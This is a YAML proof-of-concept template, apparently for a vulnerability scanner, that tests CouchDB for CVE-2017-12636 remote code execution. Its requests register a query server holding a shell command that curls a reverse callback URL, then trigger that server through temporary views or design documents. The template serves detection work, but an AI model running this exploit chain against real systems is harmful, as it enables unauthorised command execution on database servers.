name: poc-yaml-couchdb-cve-2017-12636-rce
binding: 8ff24492-851e-4a1f-a5aa-b39b47fcf68d
manual: true
detail:
    author: lif3reb00t
    links:
        - https://www.exploit-db.com/exploits/44913
        - https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635
        - https://github.com/moayadalmalat/CVE-2017-12636/blob/master/exp.py
        - https://github.com/XTeam-Wing/CVE-2017-12636/blob/master/exp.py
    vulnerability:
        id: CT-131619
        level: high
transport: http
set:
    reverse: newReverse()
    reverseURL: reverse.url
    name: randomLowercase(8)
    id: randomLowercase(8)
payloads:
    payloads:
        curl:
            cmd: |
                "curl -v " + string(reverseURL) + " > /tmp/curltest"
rules:
    check:
        expression: |
            "Authorization" in request.headers
        output:
            auth: |
                "(?P<username>[^:]+):(?P<password>[^:]+)".submatch(base64Decode(request.headers["Authorization"]))
            username: auth["username"]
    v1prepare:
        request:
            cache: false
            method: PUT
            path: /_config/query_servers/{{name}}
            headers:
                Content-Type: application/json
            body: '"{{cmd}}"'
            follow_redirects: false
        expression: |
            response.status == 200
    v2prepare1:
        request:
            cache: false
            method: GET
            path: /_membership
            headers:
                Content-Type: application/json
            follow_redirects: false
        expression: response.status == 200
        output:
            search: |-
                '"cluster_nodes":\\["(?P<node>.*?)"\\]'.bsubmatch(response.body)
            nodes: search["node"]
    v2prepare2:
        request:
            cache: false
            method: PUT
            path: /_node/{{nodes}}/_config/query_servers/{{name}}
            headers:
                Content-Type: application/json
            body: '"{{cmd}}"'
            follow_redirects: false
        expression: |
            response.status == 200
    common1:
        request:
            cache: false
            method: PUT
            path: /{{username}}
            headers:
                Content-Type: application/json
            follow_redirects: false
        expression: response.status == 201 && response.body.bcontains(b"true") || response.status == 412 && response.body.bcontains(b"file_exists")
    common2:
        request:
            cache: false
            method: PUT
            path: /{{username}}/vul
            headers:
                Content-Type: application/json
            body: |
                {"_id": "{{id}}"}
            follow_redirects: false
        expression: response.status == 201 && response.body.bcontains(b"vul") && response.body.bcontains(b"true") || response.status == 409 && response.body.bcontains(b"conflict")
    v1exec:
        request:
            cache: false
            method: POST
            path: /{{username}}/_temp_view?limit=10
            headers:
                Content-Type: application/json
            body: |
                {"language":"{{name}}","map":""}
            follow_redirects: false
        expression: |
            response.status == 500 && response.body.bcontains(b"couch_query_servers") && reverse.wait(10)
    v2exec:
        request:
            cache: false
            method: PUT
            path: /{{username}}/_design/vul
            headers:
                Content-Type: application/json
            body: |
                {"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"{{name}}"}
            follow_redirects: false
        expression: |
            response.status == 500 && reverse.wait(10)
expression: check() && (v1prepare() && common1() && common2() && v1exec() || v2prepare1() && v2prepare2() && common1() && common2() && v2exec())
